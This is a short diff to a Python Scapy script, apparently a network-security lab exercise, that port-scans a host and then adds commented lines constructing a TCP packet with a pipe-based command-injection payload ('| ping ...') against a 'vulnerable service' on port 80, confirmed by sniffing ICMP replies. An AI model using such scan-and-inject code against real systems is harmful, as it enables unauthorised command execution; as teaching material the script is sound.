@@ -11,6 +11,7 @@ if os.geteuid() != 0:
 DEST_IP_ADDR = "99.99.99.254"
 DEST_PORT_RANGE = (0, 100)
 PACKET_ANS_TIMEOUT = 5
+VULNERABLE_SERVICE_PORT = 80
 
 try:
     # Sending SYN packets and receiving responses.
@@ -28,6 +29,9 @@ try:
     # Exploiting any available service...
     # Running some instructions... injecting commands...
     # Sending ICMP echo-request command as instruction to the vulnerable machine to execute.
+    # Something like the following packet could be constructed and sended:
+    # inj_packet = IP(dst = DEST_IP_ADDR)/TCP(dport = VULNERABLE_SERVICE_PORT)/"| ping 99.99.99.50 -n 5"
+    # sr(inj_packet)
 
     # Sniffing network activity
     cap = sniff(iface = "eth0", count = 5, filter = "icmp and host 99.99.99.254", prn = lambda p: p.sprintf("Received ICMP packet from %IP.dst%"))
